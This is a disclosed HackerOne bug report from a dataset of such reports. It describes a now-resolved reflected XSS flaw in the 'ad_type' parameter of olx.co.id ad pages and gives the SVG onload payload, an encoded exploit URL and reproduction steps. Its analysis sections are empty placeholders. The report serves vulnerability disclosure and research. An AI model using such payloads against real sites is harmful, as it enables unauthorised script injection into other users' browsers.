---
source: hackerone
dataset: elamaran619/hackerone_disclosed_reports
h1_id: '630265'
original_report_id: '630265'
title: Reflected XSS on https://www.olx.co.id/iklan/*.html via "ad_type" parameter
weakness: Cross-site Scripting (XSS) - Reflected
team_handle: olx
created_at: '2019-06-26T23:28:18.426Z'
disclosed_at: '2019-09-21T12:08:40.556Z'
has_bounty: false
visibility: full
substate: resolved
vote_count: 35
tags:
- hackerone
- cross-site-scripting-xss-reflected
---

# Reflected XSS on https://www.olx.co.id/iklan/*.html via "ad_type" parameter

## Metadata

- HackerOne Report ID: 630265
- Weakness: Cross-site Scripting (XSS) - Reflected
- Program: olx
- Disclosed At: 2019-09-21T12:08:40.556Z
- Has Bounty: No
- Visibility: full
- Substate: resolved

## Original Report

I found Reflected XSS on https://www.olx.co.id/

- Vulnerability URL : https://www.olx.co.id/iklan/*.html
- Payloads: `"><svg onload=(alert)(1)>`

Proof of Concept:
1. Try to find every URL like this URL structure https://www.olx.co.id/iklan/*.html
2. And add the payloads in `ad_type` parameter, example: https://www.olx.co.id/iklan/baju-pesta-pemakaian-1x-IDzVCT1.html?ad_type=%22%3E%3Csvg%20onload=(alert)(1)%3E
3. XSS will fire up.

## Impact

XSS Attack.

## Extracted Security Notes

### Likely Vulnerability Class

*Leave this section for future enrichment.*

### Likely Root Cause

*Leave this section for future enrichment.*

### Potential Impact

*Leave this section for future enrichment.*

### Defensive Test Cases

*Leave this section for future enrichment.*

### Remediation Ideas

*Leave this section for future enrichment.*
